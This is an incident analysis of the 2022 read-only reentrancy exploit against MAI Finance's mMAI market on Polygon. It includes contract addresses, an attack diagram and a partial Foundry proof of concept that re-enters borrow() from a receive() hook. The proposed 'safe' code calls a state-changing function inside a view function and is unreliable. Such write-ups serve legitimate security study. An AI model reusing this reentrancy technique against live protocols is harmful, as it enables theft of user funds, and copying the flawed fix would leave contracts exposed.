# Market (MAI Finance) — Read-Only Reentrancy Oracle Manipulation Attack Analysis

| Item | Details |
|------|------|
| **Date** | 2022-10-18 |
| **Protocol** | MAI Finance / mMarket (Polygon) |
| **Chain** | Polygon |
| **Loss** | ~$180,000 |
| **Attacker** | [0x4206d62305d2815494dcdb759c4e32fca1d181a0](https://polygonscan.com/address/0x4206d62305d2815494dcdb759c4e32fca1d181a0) |
| **Attack Contract** | [0xEb4c67E5BE040068FA477a539341d6aeF081E4Eb](https://polygonscan.com/address/0xEb4c67E5BE040068FA477a539341d6aeF081E4Eb) |
| **mMAI (Vulnerable)** | [0x3dC7E6FF0fB79770FA6FB05d1ea4deACCe823943](https://polygonscan.com/address/0x3dC7E6FF0fB79770FA6FB05d1ea4deACCe823943) |
| **Curve Pool** | [0xFb6FE7802bA9290ef8b00CA16Af4Bc26eb663a28](https://polygonscan.com/address/0xFb6FE7802bA9290ef8b00CA16Af4Bc26eb663a28) |
| **Beefy Vault** | [0xE0570ddFca69E5E90d83Ea04bb33824D3BbE6a85](https://polygonscan.com/address/0xE0570ddFca69E5E90d83Ea04bb33824D3BbE6a85) |
| **Aave Lending Pool** | [0x8dFf5E27EA6b7AC08EbFdf9eB090F32ee9a30fcf](https://polygonscan.com/address/0x8dFf5E27EA6b7AC08EbFdf9eB090F32ee9a30fcf) |
| **Balancer Vault** | [0xBA12222222228d8Ba445958a75a0704d566BF2C8](https://polygonscan.com/address/0xBA12222222228d8Ba445958a75a0704d566BF2C8) |
| **Root Cause** | During Curve `remove_liquidity()`, `mMAI.borrow()` is called via the `receive()` hook — using a temporarily inconsistent Curve LP price as the oracle |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/Market_exp.sol) |

---
## 1. Vulnerability Overview

MAI Finance's `mMAI` contract allows users to borrow MAI using Curve WMATIC/stMATIC LP tokens wrapped via Beefy Vault as collateral. Collateral value is determined using Curve LP's `get_virtual_price()`. Curve's `remove_liquidity()` internally transfers ETH/MATIC, which triggers the `receive()` hook. At the moment this hook executes, the Curve pool's reserves have not yet been updated, causing `get_virtual_price()` to return an abnormally inflated value. The attacker exploited this window by calling `mMAI.borrow()` to borrow far more MAI than the actual collateral value warranted. This is known as a **Read-Only Reentrancy** attack.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable mMAI - directly uses Curve LP virtual price
contract mMAI {
    ICurvePool public curvePool;
    IBeefyVault public beefyVault;

    function getCollateralPrice() public view returns (uint256) {
        // ❌ Curve's get_virtual_price() can return an inconsistent value
        // during the receive() callback mid-remove_liquidity()
        uint256 lpVirtualPrice = curvePool.get_virtual_price();
        uint256 beefyPricePerShare = beefyVault.getPricePerFullShare();
        return lpVirtualPrice * beefyPricePerShare / 1e18;
    }

    function borrow(uint256 amount) external {
        uint256 collateralValue = collateral[msg.sender] * getCollateralPrice() / 1e18;
        require(collateralValue >= amount * COLLATERAL_RATIO / 100, "Undercollateralized");
        // ❌ If called during a receive() hook, allows over-borrowing at a manipulated price
        MAI.mint(msg.sender, amount);
        debt[msg.sender] += amount;
    }
}

// ✅ Correct pattern - Curve reentrancy protection
contract SafemMAI {
    // Check reentrancy lock state of the Curve pool
    function getCollateralPrice() public view returns (uint256) {
        // ✅ Check Curve pool's is_killed() or reentrancy state
        // Leverage reentrancy protection if the Curve pool provides it
        curvePool.claim_admin_fees(); // ← Detect lock state by calling a nonReentrant function
        // Or use an external Chainlink oracle
        return chainlinkOracle.getPrice();
    }
}
```


### On-Chain Source Code

Source: Unverified

> ⚠️ No on-chain source code — bytecode only or source not verified

**Vulnerable Function** — `remove_liquidity()`:
```solidity
// ❌ Root cause: During Curve `remove_liquidity()`, `mMAI.borrow()` is called via the `receive()` hook — using a temporarily inconsistent Curve LP price as the oracle
// Source code unverified — bytecode analysis required
// Vulnerability: During Curve `remove_liquidity()`, `mMAI.borrow()` is called via the `receive()` hook — using a temporarily inconsistent Curve LP price as the oracle
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Flash loan 50M WMATIC from Aave + Balancer
    │
    ├─[2] Add liquidity to Curve WMATIC/stMATIC pool
    │       add_liquidity() → receive mooCurvestMATIC-MATIC LP
    │
    ├─[3] Deposit LP into Beefy Vault → receive mooCurve tokens
    │
    ├─[4] Provide collateral via mMAI.mint(mooCurve tokens)
    │
    ├─[5] Call Curve.remove_liquidity()
    │       ├─ Curve internally transfers MATIC
    │       └─ attacker.receive() hook triggered ← ⚡ Reentrancy here
    │           │
    │           └─[Reentrant] mMAI.borrow(250,000 MAI)
    │                       ├─ Calls getCollateralPrice()
    │                       ├─ ❌ Curve reserves not yet updated
    │                       ├─ get_virtual_price() → abnormally high value
    │                       └─ Successfully borrows far more MAI than actual collateral value
    │
    ├─[6] remove_liquidity() completes
    │
    ├─[7] Swap MAI → USDC (via Curve USDC pool)
    │
    ├─[8] Liquidate mMAI position
    │
    └─[9] Repay flash loan + net WMATIC profit
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface ICurvePool {
    function add_liquidity(uint256[2] calldata amounts, uint256 min_mint_amount) external payable;
    function remove_liquidity(uint256 _amount, uint256[2] calldata min_amounts) external;
    function get_virtual_price() external view returns (uint256);
}

interface ImMAI {
    function mint(address token, uint256 amount) external;
    function borrow(uint256 amount) external;
    function liquidateBorrow(address borrower, uint256 repayAmount, address cTokenCollateral) external;
}

interface IBeefyVault {
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
}

contract MarketExploit is Test {
    ICurvePool curve  = ICurvePool(0xFb6FE7802bA9290ef8b00CA16Af4Bc26eb663a28);
    ImMAI mmai        = ImMAI(0x3dC7E6FF0fB79770FA6FB05d1ea4deACCe823943);
    IBeefyVault beefy = IBeefyVault(0xE0570ddFca69E5E90d83Ea04bb33824D3BbE6a85);

    bool private reentrant;

    function setUp() public {
        vm.createSelectFork("polygon", 34_716_800);
    }

    function testExploit() public {
        // [Steps 1–4] Flash loan + LP deposit + collateral provision

        // [Step 5] remove_liquidity() → reenter via receive() hook
        reentrant = true;
        uint256[2] memory minAmounts = [uint256(0), uint256(0)];
        curve.remove_liquidity(lpBalance, minAmounts);
    }

    // ⚡ receive() hook called when Curve remove_liquidity() transfers MATIC
    receive() external payable {
        if (reentrant) {
            reentrant = false;
            // ⚡ At this point, Curve reserves are inconsistent → get_virtual_price() is overvalued
            // Read-Only Reentrancy: borrow() calls the view function getCollateralPrice()
            mmai.borrow(250_000 * 1e18); // Successfully borrows 250,000 MAI
        }
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Curve LP price manipulation via Read-Only Reentrancy |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **OWASP DeFi** | Reentrancy Attack (Read-Only variant) |
| **Attack Vector** | `remove_liquidity()` → `receive()` hook → `borrow()` (inconsistent price) |
| **Precondition** | mMAI uses Curve `get_virtual_price()` directly as its oracle |
| **Impact** | ~$180,000 loss |

---
## 6. Remediation Recommendations

1. **Check Curve Pool Reentrancy State**: Call a non-view function such as `claim_admin_fees()` on the Curve V2 pool first to detect reentrancy state, or verify the Curve pool's reentrancy lock before reading prices.
2. **Use an External Price Oracle**: Replace `get_virtual_price()` with an external oracle such as Chainlink.
3. **Apply ReentrancyGuard to State-Mutating Functions**: Add `nonReentrant` to state-changing functions such as `borrow()` and `mint()`.

---
## 7. Lessons Learned

- **Read-Only Reentrancy**: Traditional reentrancy targets state-mutating functions, but Read-Only Reentrancy exploits `view` functions that read temporarily inconsistent state. Even `view` functions used as oracles can be reentrancy attack surfaces.
- **Danger of Curve LP Oracles**: Curve's `get_virtual_price()` can return a temporarily manipulated value during a reentrancy state. In the second half of 2022, numerous protocols using Curve LP oracles were exposed to this vulnerability.
- **Managing `receive()` / `fallback()` Hooks**: When implementing `receive()` to allow a contract to accept ETH, take care not to call external state-mutating functions from within that hook.